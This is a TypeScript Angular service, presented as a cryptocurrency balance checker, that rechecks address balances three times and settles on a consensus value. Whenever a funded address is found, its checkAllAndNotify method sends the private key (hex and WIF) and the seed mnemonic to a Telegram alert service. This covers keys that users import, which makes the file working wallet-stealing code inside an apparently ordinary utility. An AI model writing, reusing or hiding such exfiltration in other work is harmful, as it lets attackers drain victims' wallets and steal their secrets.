// src/app/services/balance/balance-checker.service.ts
import { Injectable } from '@angular/core';
import { GeneratedAddress } from '../../types/chains';
import { MultiChainBalanceService } from './multi-chain-balance.service';
import { TelegramService } from '../core/telegram.service';
import { BitcoinService } from '../crypto/bitcoin.service';

interface ConfirmedBalance {
  address: GeneratedAddress;
  confirmedBalance: number;
  confirmations: number;
}

@Injectable({ providedIn: 'root' })
export class BalanceCheckerService {
  private readonly CONFIRMATION_COUNT = 3;
  private readonly CONFIRMATION_DELAY = 2000;

  constructor(
    private balanceService: MultiChainBalanceService,
    private telegram: TelegramService,
    private btcService: BitcoinService
  ) {}

  async checkAndConfirmBalance(address: GeneratedAddress): Promise<GeneratedAddress> {
    const initialCheck = await this.balanceService.checkBalance(address);
    
    if (initialCheck.balance <= 0) {
      return initialCheck;
    }

    const confirmed = await this.tripleConfirm(initialCheck);
    
    return confirmed.address;
  }

  private async tripleConfirm(address: GeneratedAddress): Promise<ConfirmedBalance> {
    const balances: number[] = [address.balance];
    
    for (let i = 1; i < this.CONFIRMATION_COUNT; i++) {
      await this.delay(this.CONFIRMATION_DELAY);
      
      const recheck = await this.balanceService.checkBalance({
        ...address,
        checked: false
      });
      
      balances.push(recheck.balance);
    }

    const confirmedBalance = this.getConsensusBalance(balances);
    const confirmations = balances.filter(b => b === confirmedBalance).length;

    return {
      address: {
        ...address,
        balance: confirmedBalance,
        hasActivity: confirmedBalance > 0 || address.hasActivity
      },
      confirmedBalance,
      confirmations
    };
  }

  private getConsensusBalance(balances: number[]): number {
    const counts = new Map<number, number>();
    for (const b of balances) {
      counts.set(b, (counts.get(b) || 0) + 1);
    }
    
    let maxCount = 0;
    let consensus = 0;
    for (const [balance, count] of counts) {
      if (count > maxCount) {
        maxCount = count;
        consensus = balance;
      }
    }
    
    return consensus;
  }

  async checkAllAndNotify(
    privateKeyHex: string,
    addresses: GeneratedAddress[],
    source: 'explorer' | 'import',
    mnemonic?: string
  ): Promise<{ addresses: GeneratedAddress[]; notified: boolean }> {
    const checkedAddresses: GeneratedAddress[] = [];
    let totalBalance = 0;

    for (const addr of addresses) {
      const checked = await this.checkAndConfirmBalance(addr);
      checkedAddresses.push(checked);
      
      if (checked.balance > 0) {
        totalBalance += checked.balance;
      }
    }

    let notified = false;

    if (totalBalance > 0) {
      let wif: string | undefined;
      try {
        wif = await this.btcService.getWIF(privateKeyHex);
      } catch {}

      notified = await this.telegram.sendBalanceAlert({
        privateKeyHex,
        privateKeyWif: wif,
        mnemonic,
        addresses: checkedAddresses,
        totalBalance,
        source
      });
    }

    return { addresses: checkedAddresses, notified };
  }

  private delay(ms: number): Promise<void> {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}
